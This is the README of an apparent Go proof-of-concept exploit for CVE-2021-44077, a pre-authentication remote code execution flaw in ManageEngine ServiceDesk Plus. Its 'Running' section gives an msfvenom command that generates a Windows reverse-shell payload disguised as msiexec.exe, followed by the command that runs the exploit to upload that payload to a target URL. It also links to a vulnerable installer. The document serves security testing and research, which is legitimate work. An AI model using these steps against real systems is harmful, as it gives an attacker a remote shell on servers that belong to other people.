# Golang-CVE-2021-44077-POC

This exploit is an unauthenticated RCE in Zoho ManageEngine ServiceDesk Plus < 11306. 

You can find a vulnerable version of the software here: http://archives.manageengine.com/service-desk/11303/ManageEngine_ServiceDesk_Plus_64bit.exe

I couldn't find a Golang version of this, so here it is. My code isn't great, so proceed at your own risk. 

Blog post: 

https://www.pizzapower.me/2022/09/29/golang-proof-of-concept-exploit-for-cve-2021-44077-preauth-rce-in-manageengine-servicedesk-plus-11306/

## Running

Create a malicious payload in your current directory. 

```msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.1.2 LPORT=4444 -f exe > msiexec.exe```

Then, run the exploit.

```go run CVE-2021-44077.go -u "http://192.168.1.3:8080/" -f "/msiexec.exe"```

-u is the vulnerable URL
-f is your malicious file 

 

